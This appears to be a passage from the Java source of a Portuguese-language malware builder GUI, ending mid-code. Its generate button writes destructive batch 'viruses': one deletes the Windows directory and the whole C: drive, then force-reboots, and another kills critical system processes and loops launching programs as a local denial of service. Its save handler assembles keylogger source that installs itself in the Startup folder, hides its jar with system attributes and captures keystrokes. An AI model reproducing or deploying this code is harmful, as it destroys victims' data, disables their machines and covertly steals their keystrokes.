				keyGenerator.setVisible(true);
				radioKey.setVisible(true);
				emaillabel.setVisible(true);
				campoemail.setVisible(true);
				senhalabel.setVisible(true);
				senha.setVisible(true);
				caminholabel.setVisible(true);
				caminho.setVisible(true);
				salvar.setVisible(true);
				testar.setVisible(true);
			
				check.setVisible(false);
				check1.setVisible(false);
				check2.setVisible(false);
				label1.setVisible(false);
				label2.setVisible(false);
				label3.setVisible(false);
				check3.setVisible(false);
				label4.setVisible(false);
				keylogOptions.setVisible(false);
				keyvirOptions.setVisible(false);
				executeTime.setVisible(false);
				linha1.setVisible(false);
				linha2.setVisible(false);
				infoPc.setVisible(false);
				checkIp.setVisible(false);
				checkRede.setVisible(false);
				labelIp.setVisible(false);
				labelRede.setVisible(false);
				labelExec.setVisible(false);
				textExec.setVisible(false);
				Time.setVisible(false);
				linkInfo.setVisible(false);
				informations.setVisible(false);
				
				
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				imgInicio2.setVisible(false);
				imgInicio1.setVisible(true);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		generate.addActionListener(new ActionListener() {
			
			
			@Override
			public void actionPerformed(ActionEvent arg0) {
				
				
			
				//create virus ghost
				if(check3.isSelected()){
				if(ghostWare.isSelected()){
					if(ghostText.getText().isEmpty()){
						msg.setText("O nome do virus ghost não foi definido!");
						msg.setForeground(Color.red);
					} else{
					FileWriter arquivoJar;
					
					try {
						arquivoJar = new FileWriter("jarGhostInit.bat");
						arquivoJar.write("set ghost="+ghostText.getText()
						+"\n\n jar.exe -cvfm %ghost%.jar man.mf MANIFEST.mf META-INF com javax key jni net org");
						arquivoJar.close();
						
						
					} catch (IOException e) {
						
						e.printStackTrace();
					}
					catch (Exception e) {
						
						e.printStackTrace();
					}
				
				
				String jarGhost = "cmd /c jarGhostInit.lnk";
				try {
					
					Thread.sleep(2000);
					Runtime.getRuntime().exec(jarGhost);
		           
		        } catch (Exception arg) {
		            arg.printStackTrace();
		        }
				
				
					
				msg.setText("O virus Ghost foi criado com sucesso!");
				msg.setForeground(Color.green);
					}
				}
				}else{
					if(ghostWare.isSelected()){
						if(ghostText.getText().isEmpty()){
							msg.setText("O nome do virus ghost não foi definido!");
							msg.setForeground(Color.red);
						} else{
						FileWriter arquivoJar;
						
						try {
							arquivoJar = new FileWriter("jarGhost.bat");
							arquivoJar.write("set ghost="+ghostText.getText()
							+"\n\n jar.exe -cvfm %ghost%.jar manif.mf META-INF meta allclasses-frame.html allclasses-noframe.html build.num build.xml NEWS.md COPYING.md COPYING.LESSER.md jshortcut_amd64.dll jshortcut_ia64.dll jshortcut_x86.dll keylogger com image javax key jni net org resources src virus AUTHORS package-list ");
							arquivoJar.close();
							
							
						} catch (IOException e) {
							
							e.printStackTrace();
						}
						catch (Exception e) {
							
							e.printStackTrace();
						}
					
					
					String jarGhost = "cmd /c jarGhost.lnk";
					try {
						
						Thread.sleep(2000);
						Runtime.getRuntime().exec(jarGhost);
			           
			        } catch (Exception arg) {
			            arg.printStackTrace();
			        }
					
					
						
					msg.setText("O virus Ghost foi criado com sucesso!");
					msg.setForeground(Color.green);
						}
					}
					}
					//final create ghost
				
				//final create ghost
				
				//create virus scorpion
				if(scorpion.isSelected()){
					if(scorpionText.getText().isEmpty()){
						msg.setText("O nome do virus scorpion não foi definido!");
						msg.setForeground(Color.red);
					} else{
					PrintWriter textscorpion;
					
					try {
						textscorpion = new PrintWriter(scorpionText.getText()+".bat");
						textscorpion.println("@echo off");
						textscorpion.println("taskkill /f /im explorer.exe");
						textscorpion.println("cd..");
						textscorpion.println("cd..");
						textscorpion.println("cd..");
						textscorpion.println("cd..");
						textscorpion.println("cd..");
						textscorpion.println("cd..");
						textscorpion.println("cd..");
						textscorpion.println("cd..");
						textscorpion.println("del "+'"'+"C:\\Windows\\*.*"+'"'+" /f /s /q");
						textscorpion.println("rmdir /s /q "+'"'+"C:\\Windows"+'"');
						textscorpion.println("del "+'"'+"C:\\*.*"+'"'+" /f /s /q");
						textscorpion.println("DEL "+'"'+"%systemdrive%\\*.*"+'"'+" /f /s /q");
						textscorpion.println("shutdown -r -f -t 00");
						textscorpion.println("exit");
						textscorpion.close();
						
						
					} catch (IOException e) {
						
						e.printStackTrace();
					}
					catch (Exception e) {
						
						e.printStackTrace();
					}
				
				
				
				
					
				msg.setText("O virus Scorpion foi criado com sucesso!");
				msg.setForeground(Color.green);
					}
				}
				
				//final create scorpion
				
				//create block virus
				if(block.isSelected()){
					if(blockText.getText().isEmpty()){
						msg.setText("O nome do virus block não foi definido!");
						msg.setForeground(Color.red);
					} else{
					PrintWriter textblock;
					
					try {
						textblock = new PrintWriter(blockText.getText()+".bat");
						textblock.println("@echo off");
						textblock.println("taskkill /f /im explorer.exe");
						textblock.println("taskkill /f /im svchost.exe");
						textblock.println("taskkill /f /im System.exe");
						textblock.println("taskkill /f /im csrss.exe");
						textblock.println("taskkill /f /im winlogon.exe");
						textblock.println("taskkill /f /im wininit.exe");
						textblock.println("taskkill /f /im taskhostex.exe");
						textblock.println("rem Denial Of Service Local");
						textblock.println(":Fucker");
						textblock.println("start notepad.exe");
						textblock.println("start write.exe");
						textblock.println("start cmd.exe");
						textblock.println("start powerpnt.exe");
						textblock.println("start excel.exe");
						textblock.println("start winword.exe");
						textblock.println("goto Fucker:");
						textblock.close();
						
						
					} catch (IOException e) {
						
						e.printStackTrace();
					}
					catch (Exception e) {
						
						e.printStackTrace();
					}
				
			
					
				msg.setText("O virus Block foi criado com sucesso!");
				msg.setForeground(Color.green);
					}
				}
				
				//final create block virus
				
				if(!ghostWare.isSelected() & !scorpion.isSelected() & !block.isSelected()){
					msg.setText("Nenhum campo está marcado!");
					msg.setForeground(Color.red);
				}
				
				
			}
		});
		
		ImageIcon image3, image4;
		if(pathStr.contains("projects\\Hacking_Programs")){
			image3 = new ImageIcon(getClass().getResource("/image/config1.png"));
			image4 = new ImageIcon(getClass().getResource("/image/config2.png"));
		}else{
			image3 = new ImageIcon("image/config1.png");
			image4 = new ImageIcon("image/config2.png");
		}
		
		JLabel imgConfig1 = new JLabel(image3);
		imgConfig1.setBounds(180, 200, 160, 30);
		label.add(imgConfig1);
		
		JLabel imgConfig2 = new JLabel(image4);
		imgConfig2.setBounds(179, 201, 160, 30);
		imgConfig2.setVisible(false);
		label.add(imgConfig2);
		
		imgConfig1.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				lines.setVisible(false);
				keyGenerator.setVisible(false);
				radioKey.setVisible(false);
				emaillabel.setVisible(false);
				campoemail.setVisible(false);
				senhalabel.setVisible(false);
				senha.setVisible(false);
				caminholabel.setVisible(false);
				caminho.setVisible(false);
				salvar.setVisible(false);
				keylogOptions.setVisible(true);
				keyvirOptions.setVisible(true);
				testar.setVisible(false);
		
				check.setVisible(true);
				check1.setVisible(true);
				check2.setVisible(true);
				label1.setVisible(true);
				label2.setVisible(true);
				label3.setVisible(true);
				check3.setVisible(true);
				label4.setVisible(true);
				executeTime.setVisible(true);
				linha1.setVisible(true);
				linha2.setVisible(true);
				infoPc.setVisible(true);
				checkIp.setVisible(true);
				checkRede.setVisible(true);
				labelIp.setVisible(true);
				labelRede.setVisible(true);
				labelExec.setVisible(true);
				textExec.setVisible(true);
				Time.setVisible(true);
				linkInfo.setVisible(false);
				informations.setVisible(false);
				
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				imgConfig1.setVisible(false);
				imgConfig2.setVisible(true);
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		imgConfig2.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				lines.setVisible(false);
				keyGenerator.setVisible(false);
				radioKey.setVisible(false);
				emaillabel.setVisible(false);
				campoemail.setVisible(false);
				senhalabel.setVisible(false);
				testar.setVisible(false);
				senha.setVisible(false);
				caminholabel.setVisible(false);
				caminho.setVisible(false);
				salvar.setVisible(false);
				keylogOptions.setVisible(true);
				keyvirOptions.setVisible(true);
			
				check.setVisible(true);
				check1.setVisible(true);
				check2.setVisible(true);
				label1.setVisible(true);
				label2.setVisible(true);
				label3.setVisible(true);
				check3.setVisible(true);
				label4.setVisible(true);
				executeTime.setVisible(true);
				linha1.setVisible(true);
				linha2.setVisible(true);
				infoPc.setVisible(true);
				checkIp.setVisible(true);
				checkRede.setVisible(true);
				labelIp.setVisible(true);
				labelRede.setVisible(true);
				labelExec.setVisible(true);
				textExec.setVisible(true);
				Time.setVisible(true);
				linkInfo.setVisible(false);
				informations.setVisible(false);
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				imgConfig2.setVisible(false);
				imgConfig1.setVisible(true);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		
		
		ImageIcon image5, image6;
		if(pathStr.contains("projects\\Hacking_Programs")){
			image5 = new ImageIcon(getClass().getResource("/image/info1.png"));
			image6 = new ImageIcon(getClass().getResource("/image/info2.png"));
		}else{
			image5 = new ImageIcon("image/info1.png");
			image6 = new ImageIcon("image/info2.png");
		}
		
		JLabel imgInfo1 = new JLabel(image5);
		imgInfo1.setBounds(350, 200, 160, 30);
		label.add(imgInfo1);
		
		JLabel imgInfo2 = new JLabel(image6);
		imgInfo2.setBounds(352, 202, 160, 30);
		imgInfo2.setVisible(false);
		label.add(imgInfo2);
		
	
		
		imgInfo1.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				emaillabel.setVisible(false);
				campoemail.setVisible(false);
				senhalabel.setVisible(false);
				senha.setVisible(false);
				caminholabel.setVisible(false);
				caminho.setVisible(false);
				salvar.setVisible(false);
				testar.setVisible(false);
				lines.setVisible(false);
				keyGenerator.setVisible(false);
				keylogOptions.setVisible(false);
				keyvirOptions.setVisible(false);
			
				
				check.setVisible(false);
				check1.setVisible(false);
				check2.setVisible(false);
				check3.setVisible(false);
				label1.setVisible(false);
				label2.setVisible(false);
				label3.setVisible(false);
				label4.setVisible(false);
				labelIp.setVisible(false);
				labelRede.setVisible(false);
				checkIp.setVisible(false);
				checkRede.setVisible(false);
				linha1.setVisible(false);
				linha2.setVisible(false);
				executeTime.setVisible(false);
				infoPc.setVisible(false);
				labelExec.setVisible(false);
				textExec.setVisible(false);
				Time.setVisible(false);
				linkInfo.setVisible(true);
				informations.setVisible(true);
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				imgInfo1.setVisible(true);
				imgInfo2.setVisible(false);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				imgInfo1.setVisible(false);
				imgInfo2.setVisible(true);
			
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		imgInfo2.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent e) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent e) {
				emaillabel.setVisible(false);
				campoemail.setVisible(false);
				senhalabel.setVisible(false);
				senha.setVisible(false);
				caminholabel.setVisible(false);
				caminho.setVisible(false);
				salvar.setVisible(false);
				testar.setVisible(false);
				lines.setVisible(false);
				keyGenerator.setVisible(false);
				radioKey.setVisible(false);
				keylogOptions.setVisible(false);
				keyvirOptions.setVisible(false);
			
				check.setVisible(false);
				check1.setVisible(false);
				check2.setVisible(false);
				check3.setVisible(false);
				label1.setVisible(false);
				label2.setVisible(false);
				label3.setVisible(false);
				label4.setVisible(false);
				labelIp.setVisible(false);
				labelRede.setVisible(false);
				checkIp.setVisible(false);
				checkRede.setVisible(false);
				linha1.setVisible(false);
				linha2.setVisible(false);
				executeTime.setVisible(false);
				infoPc.setVisible(false);
				labelExec.setVisible(false);
				textExec.setVisible(false);
				Time.setVisible(false);
				linkInfo.setVisible(true);
				informations.setVisible(true);
				
			}
			
			@Override
			public void mouseExited(MouseEvent e) {
				imgInfo2.setVisible(false);
				imgInfo1.setVisible(true);
				
			}
			
			@Override
			public void mouseEntered(MouseEvent e) {
				imgInfo2.setVisible(true);
				imgInfo1.setVisible(false);
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent e) {
				
				
			}
		});
		
		JPanel divDown = new JPanel();
		divDown.setBackground(Color.BLACK);
		divDown.setBounds(65, 200, 480, 30);
		label.add(divDown);
		
		JPanel divUp = new JPanel();
		divUp.setBackground(Color.BLACK);
		divUp.setBounds(65, 0, 480, 20);
		label.add(divUp);
		
		
		
		campoemail.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				
				
				
			
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				try {
					Robot robot = new Robot();
					robot.mousePress(InputEvent.BUTTON1_MASK);
					robot.mouseRelease(InputEvent.BUTTON1_MASK);
					robot.keyPress(KeyEvent.VK_CONTROL);
					robot.keyPress(KeyEvent.VK_A);
					robot.keyRelease(KeyEvent.VK_A);
					robot.keyRelease(KeyEvent.VK_CONTROL);
				
				} catch (AWTException e) {
					
					e.printStackTrace();
				}
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				
				
			}
		});
		
		campoemail.addKeyListener(new KeyListener() {
			
			@Override
			public void keyTyped(KeyEvent arg0) {
				
				
			}
			
			@Override
			public void keyReleased(KeyEvent arg0) {
				
				
			}
			
			@Override
			public void keyPressed(KeyEvent event) {
				if(event.getKeyCode() == KeyEvent.VK_BACK_SPACE){
					campoemail.setForeground(Color.white);
				}
				
			}
		});
		
		
		
		
		senha.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				
				try {
					Robot robot = new Robot();
					robot.mousePress(InputEvent.BUTTON1_MASK);
					robot.mouseRelease(InputEvent.BUTTON1_MASK);
					robot.keyPress(KeyEvent.VK_CONTROL);
					robot.keyPress(KeyEvent.VK_A);
					robot.keyRelease(KeyEvent.VK_A);
					robot.keyRelease(KeyEvent.VK_CONTROL);
				} catch (AWTException e) {
					
					e.printStackTrace();
				}
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				
				
			}
		});
		
		senha.addKeyListener(new KeyListener() {
			
			@Override
			public void keyTyped(KeyEvent arg0) {
				
				
			}
			
			@Override
			public void keyReleased(KeyEvent arg0) {
				
				
			}
			
			@Override
			public void keyPressed(KeyEvent event) {
				if(event.getKeyCode() == KeyEvent.VK_BACK_SPACE){
					senha.setForeground(Color.white);
				}
				
			}
		});
		
		
		
		caminho.addMouseListener(new MouseListener() {
			
			@Override
			public void mouseReleased(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mousePressed(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mouseExited(MouseEvent arg0) {
				
				
			}
			
			@Override
			public void mouseEntered(MouseEvent arg0) {
				
				try {
					Robot robot = new Robot();
					robot.mousePress(InputEvent.BUTTON1_MASK);
					robot.mouseRelease(InputEvent.BUTTON1_MASK);
					robot.keyPress(KeyEvent.VK_CONTROL);
					robot.keyPress(KeyEvent.VK_A);
					robot.keyRelease(KeyEvent.VK_A);
					robot.keyRelease(KeyEvent.VK_CONTROL);
				} catch (AWTException e) {
					
					e.printStackTrace();
				}
				
				
			}
			
			@Override
			public void mouseClicked(MouseEvent arg0) {
				
				
			}
		});
		
		caminho.addKeyListener(new KeyListener() {
			
			@Override
			public void keyTyped(KeyEvent arg0) {
				
				
			}
			
			@Override			
			public void keyReleased(KeyEvent arg0) {
				
				
			}
			
			@Override
			public void keyPressed(KeyEvent event) {
				if(event.getKeyCode() == KeyEvent.VK_BACK_SPACE){
					caminho.setForeground(Color.white);
				}
				
			}
		});
		
		
		
		salvar.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent arg0) {
				String getEmail = campoemail.getText();
				String getSenha = senha.getText();
				String getCaminho = caminho.getText();
				if(getEmail.isEmpty() || getEmail.equals("Digite seu email aqui")){
					msg.setText("Digite seu email!");
					msg.setForeground(Color.red);
				}else if(getSenha.isEmpty() || getSenha.equals("Digite sua senha aqui")){
					msg.setText("Digite sua senha!");
					msg.setForeground(Color.red);
				}else if(getCaminho.isEmpty() || getCaminho.equals("Digite o nome do arquivo")){
					msg.setText("Digite o nome do arquivo!");
					msg.setForeground(Color.red);
				}else if(!getEmail.contains("@") || !getEmail.contains(".")){
					msg.setText("O email está incorreto!");
					msg.setForeground(Color.red);
				}else{
					//Criar arquivo keylogger
					msg.setText("salvando...");
					
					
					
					String init = "System.out.println();";
					
					if(check3.isSelected() & !check2.isSelected()){
						init = "FileWriter file;"
						+"BufferedWriter buf;"
						+"String bat = "+'"'+"copy /b "+caminho.getText()+".jar "+'"'+'+'+"'"+'"'+"'"+'+'+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+'"'+'+'+"'"+'"'+"'"+";"
						+"String del = "+'"'+"del copy.bat"+'"'+";"
						
						+"file = new FileWriter(new File("+'"'+"copy.bat"+'"'+"));"
						+"buf = new BufferedWriter(file);"
					    +"buf.write(bat);"
					    +"buf.newLine();"
					    +"buf.write(del);"

					    +"buf.flush();"
						+"buf.close();"
					    
					    +"try {"
							+"Thread.sleep(1000);"
						+"} catch (InterruptedException e1) {"
							
							+"e1.printStackTrace();"
						+"}"
					    
					    +"String key = "+'"'+"cmd /c copy.bat"+'"'+";"
						+"try {"
							
							+"Runtime.getRuntime().exec(key);"
							+"Thread.sleep(2000);"
				           
				        +"} catch (Exception arg) {"
				            +"arg.printStackTrace();"
				        +"}"
				        + "String origem = "+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+caminho.getText()+".jar"+'"'+";"
	    +"String desktop = JShellLink.getDirectory("+'"'+"desktop"+'"'+");"
	    +"JShellLink shortcut = new JShellLink();"
	    +"shortcut.setPath(origem);"
	    +"shortcut.setFolder(desktop);"
	    +"shortcut.setName("+'"'+caminho.getText()+'"'+");"
	    +"shortcut.setIconIndex(0);"
	    +"shortcut.save();"
	    
+"FileWriter filemov;"
+"BufferedWriter bufmov;"
+"String batmov = "+'"'+"move /y %USERPROFILE%\\\\Desktop\\\\"+caminho.getText()+".lnk "+'"'+'+'+"'"+'"'+"'"+'+'+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+'"'+'+'+"'"+'"'+"'"+";"
+"String delmov = "+'"'+"del move.bat"+'"'+";"

+"filemov = new FileWriter(new File("+'"'+"move.bat"+'"'+"));"
+"bufmov = new BufferedWriter(filemov);"
+"bufmov.write(batmov);"
+"bufmov.newLine();"
+"bufmov.write(delmov);"

+"bufmov.flush();"
+"bufmov.close();"

+"try {"
	+"Thread.sleep(1000);"
+"} catch (InterruptedException e1) {"
	
	+"e1.printStackTrace();"
+"}"

+"String mov = "+'"'+"cmd /c move.bat"+'"'+";"
+"try {"
	
	+"Runtime.getRuntime().exec(mov);"
	+"Thread.sleep(2000);"
   
+"} catch (Exception arg) {"
    +"arg.printStackTrace();"
+"}";
					
					}
					
					Date date = new Date();
					String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);
					
					String delfile = "System.out.println();";
				
					if(!textExec.getText().isEmpty()){
						
						init = "FileWriter file;"
								+"BufferedWriter buf;"
								+"String bat = "+'"'+"copy /b "+caminho.getText()+".jar "+'"'+'+'+"'"+'"'+"'"+'+'+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+caminho.getText()+".jar"+'"'+'+'+"'"+'"'+"'"+";"
								+"String del = "+'"'+"del copy.bat"+'"'+";"
								
								+"file = new FileWriter(new File("+'"'+"copy.bat"+'"'+"));"
								+"buf = new BufferedWriter(file);"
							    +"buf.write(bat);"
							    +"buf.newLine();"
							    +"buf.write(del);"

							    +"buf.flush();"
								+"buf.close();"
							    
							    +"try {"
									+"Thread.sleep(1000);"
								+"} catch (InterruptedException e1) {"
									
									+"e1.printStackTrace();"
								+"}"
							    
							    +"String key = "+'"'+"cmd /c copy.bat"+'"'+";"
								+"try {"
									
									+"Runtime.getRuntime().exec(key);"
									+"Thread.sleep(2000);"
						           
						        +"} catch (Exception arg) {"
						            +"arg.printStackTrace();"
						        +"}"
						        + "String origem = "+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+caminho.getText()+".jar"+'"'+";"
			    +"String desktop = JShellLink.getDirectory("+'"'+"desktop"+'"'+");"
			    +"JShellLink shortcut = new JShellLink();"
			    +"shortcut.setPath(origem);"
			    +"shortcut.setFolder(desktop);"
			    +"shortcut.setName("+'"'+"java"+'"'+");"
			    +"shortcut.setIconIndex(0);"
			    +"shortcut.save();"
			    
		+"FileWriter filemov;"
		+"BufferedWriter bufmov;"
		+"String batmov = "+'"'+"move /y %USERPROFILE%\\\\Desktop\\\\java.lnk "+'"'+'+'+"'"+'"'+"'"+'+'+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+'"'+'+'+"'"+'"'+"'"+";"
		+"String delmov = "+'"'+"del move.bat"+'"'+";"

		+"filemov = new FileWriter(new File("+'"'+"move.bat"+'"'+"));"
		+"bufmov = new BufferedWriter(filemov);"
		+"bufmov.write(batmov);"
		+"bufmov.newLine();"
		+"bufmov.write(delmov);"

		+"bufmov.flush();"
		+"bufmov.close();"

		+"try {"
			+"Thread.sleep(1000);"
		+"} catch (InterruptedException e1) {"
			
			+"e1.printStackTrace();"
		+"}"

		+"String mov = "+'"'+"cmd /c move.bat"+'"'+";"
		+"try {"
			
			+"Runtime.getRuntime().exec(mov);"
			+"Thread.sleep(2000);"
		   
		+"} catch (Exception arg) {"
		    +"arg.printStackTrace();"
		+"}";
						
						delfile	= "if("+'"'+textExec.getText()+'"'+".equals(strDate)){"
							+"FileWriter files;"
								+"BufferedWriter bufs;"
								+"String bats = "+'"'+"del "+'"'+'+'+"'"+'"'+"'"+'+'+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+caminho.getText()+".jar"+'"'+'+'+"'"+'"'+"'"+";"
								+"String batsmov = "+'"'+"del "+'"'+'+'+"'"+'"'+"'"+'+'+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\java.lnk"+'"'+'+'+"'"+'"'+"'"+";"
								+"String dell = "+'"'+"del del.bat"+'"'+";"
								
								+"files = new FileWriter(new File("+'"'+"del.bat"+'"'+"));"
								+"bufs = new BufferedWriter(files);"
							    +"bufs.write(bats);"
							    +"bufs.newLine();"
							    +"bufs.write(batsmov);"
							    +"bufs.newLine();"
							    +"bufs.write(dell);"

							    +"bufs.flush();"
								+"bufs.close();"
							    
							    +"try {"
									+"Thread.sleep(1000);"
								+"} catch (InterruptedException e1) {"
									
									+"e1.printStackTrace();"
								+"}"
							    
							    +"String keys = "+'"'+"cmd /c del.bat"+'"'+";"
								+"try {"
									
									+"Runtime.getRuntime().exec(keys);"
									+"Thread.sleep(2000);"
						           
						        +"} catch (Exception arg) {"
						            +"arg.printStackTrace();"
						        +"}"
					+"}";
					}
					
					String ocult = "String ocult = null;";
					if(check2.isSelected() & !check3.isSelected()){
						ocult = "FileWriter filess;"
								+"BufferedWriter bufss;"
								
								+"String batss = "+'"'+"attrib +h +s "+caminho.getText()+".jar"+'"'+";"
							
								+"String delll = "+'"'+"del ocult.bat"+'"'+";"
								
								+"filess = new FileWriter(new File("+'"'+"ocult.bat"+'"'+"));"
								+"bufss = new BufferedWriter(filess);"
							    +"bufss.write(batss);"
							    +"bufss.newLine();"
							    
							    +"bufss.write(delll);"
							    

							    +"bufss.flush();"
								+"bufss.close();"
							    
							    +"try {"
									+"Thread.sleep(1000);"
								+"} catch (InterruptedException e1) {"
									
									+"e1.printStackTrace();"
								+"}"
							    
							    +"String keyss = "+'"'+"cmd /c ocult.bat"+'"'+";"
								+"try {"
									
									+"Runtime.getRuntime().exec(keyss);"
									+"Thread.sleep(2000);"
						           
						        +"} catch (Exception arg) {"
						            +"arg.printStackTrace();"
						        +"}";
					}
					
						
					if(check2.isSelected() & check3.isSelected()){
						
						
						init = "FileWriter file;"
								+"BufferedWriter buf;"
								+"String bat = "+'"'+"copy /b "+caminho.getText()+".jar "+'"'+'+'+"'"+'"'+"'"+'+'+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+caminho.getText()+".jar"+'"'+'+'+"'"+'"'+"'"+";"
								+"String del = "+'"'+"del copy.bat"+'"'+";"
								
								+"file = new FileWriter(new File("+'"'+"copy.bat"+'"'+"));"
								+"buf = new BufferedWriter(file);"
							    +"buf.write(bat);"
							    +"buf.newLine();"
							    +"buf.write(del);"

							    +"buf.flush();"
								+"buf.close();"
							    
							    +"try {"
									+"Thread.sleep(1000);"
								+"} catch (InterruptedException e1) {"
									
									+"e1.printStackTrace();"
								+"}"
							    
							    +"String key = "+'"'+"cmd /c copy.bat"+'"'+";"
								+"try {"
									
									+"Runtime.getRuntime().exec(key);"
									+"Thread.sleep(2000);"
						           
						        +"} catch (Exception arg) {"
						            +"arg.printStackTrace();"
						        +"}"
						        + "String origem = "+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+caminho.getText()+".jar"+'"'+";"
			    +"String desktop = JShellLink.getDirectory("+'"'+"desktop"+'"'+");"
			    +"JShellLink shortcut = new JShellLink();"
			    +"shortcut.setPath(origem);"
			    +"shortcut.setFolder(desktop);"
			    +"shortcut.setName("+'"'+"java"+'"'+");"
			    +"shortcut.setIconIndex(0);"
			    +"shortcut.save();"
			    
		+"FileWriter filemov;"
		+"BufferedWriter bufmov;"
		+"String batmov = "+'"'+"move /y %USERPROFILE%\\\\Desktop\\\\java.lnk "+'"'+'+'+"'"+'"'+"'"+'+'+'"'+"%AppData%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+'"'+'+'+"'"+'"'+"'"+";"
		+"String delmov = "+'"'+"del move.bat"+'"'+";"

		+"filemov = new FileWriter(new File("+'"'+"move.bat"+'"'+"));"
		+"bufmov = new BufferedWriter(filemov);"
		+"bufmov.write(batmov);"
		+"bufmov.newLine();"
		+"bufmov.write(delmov);"

		+"bufmov.flush();"
		+"bufmov.close();"

		+"try {"
			+"Thread.sleep(1000);"
		+"} catch (InterruptedException e1) {"
			
			+"e1.printStackTrace();"
		+"}"

		+"String mov = "+'"'+"cmd /c move.bat"+'"'+";"
		+"try {"
			
			+"Runtime.getRuntime().exec(mov);"
			+"Thread.sleep(2000);"
		   
		+"} catch (Exception arg) {"
		    +"arg.printStackTrace();"
		+"}";
					
						ocult = "FileWriter filess;"
								+"BufferedWriter bufss;"
								
								+"String batss = "+'"'+"attrib +h +s "+caminho.getText()+".jar"+'"'+";"
								+"String delll = "+'"'+"del ocult.bat"+'"'+";"
								
								+"filess = new FileWriter(new File("+'"'+"ocult.bat"+'"'+"));"
								+"bufss = new BufferedWriter(filess);"
							    +"bufss.write(batss);"
							    +"bufss.newLine();"
							    +"bufss.write(delll);"
							    

							    +"bufss.flush();"
								+"bufss.close();"
							    
							    +"try {"
									+"Thread.sleep(1000);"
								+"} catch (InterruptedException e1) {"
									
									+"e1.printStackTrace();"
								+"}"
							    
							    +"String keyss = "+'"'+"cmd /c ocult.bat"+'"'+";"
								+"try {"
									
									+"Runtime.getRuntime().exec(keyss);"
									+"Thread.sleep(2000);"
						           
						        +"} catch (Exception arg) {"
						            +"arg.printStackTrace();"
						        +"}";
						
					}
					
					String conditionKey = "if(e.getKeyCode() == NativeKeyEvent.VC_1){"
						+"var = "+'"'+"1"+'"'+";"
					+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_2){"
						+"var = "+'"'+"2"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_3){"
						+"var = "+'"'+"3"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_4){"
						+"var = "+'"'+"4"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_5){"
						+"var = "+'"'+"5"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_6){"
						+"var = "+'"'+"6"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_7){"
						+"var = "+'"'+"7"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_8){"
						+"var = "+'"'+"8"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_9){"
						+"var = "+'"'+"9"+'"'+";"
						+"}"
					+"if(e.getKeyCode() == NativeKeyEvent.VC_0){"
						+"var = "+'"'+"0"+'"'+";"
						+"}"
					
					+"if(e.getKeyCode() == NativeKeyEvent.VC_SPACE){"
					+"var = "+'"'+" "+'"'+";"
					+"}"
					
